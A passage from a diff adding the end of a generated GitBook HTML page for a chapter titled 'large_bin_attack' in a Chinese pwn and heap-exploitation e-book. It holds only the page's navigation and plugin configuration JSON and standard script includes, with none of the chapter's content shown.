+            gitbook.page.hasChanged({"page":{"title":"large_bin_attack","level":"1.2.4.8","depth":3,"next":{"title":"ptmalloc_check","level":"1.2.4.9","depth":3,"path":"pwn/heap_related/ptmalloc_check/ptmalloc_check.md","ref":"pwn/heap_related/ptmalloc_check/ptmalloc_check.md","articles":[]},"previous":{"title":"how2heap解析","level":"1.2.4.7","depth":3,"path":"pwn/heap_related/how2heap学习/how2heap解析.md","ref":"pwn/heap_related/how2heap学习/how2heap解析.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-sharing","sharing-plus","-search","search-pro","code","expandable-chapters","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"livereload":{},"search-pro":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","qq","linkedin","qzone","douban"],"douban":false,"facebook":false,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"TTY","lang":"zh-cn","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Gitbook电子书","gitbook":"*","description":"Gitbook电子书示例项目"},"file":{"path":"pwn/heap_related/large_bin_attack/large_bin_attack.md","mtime":"2021-04-24T09:38:44.000Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-12-04T09:49:46.732Z"},"basePath":"../../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../../gitbook/gitbook.js"></script>
+    <script src="../../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search-pro/search.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
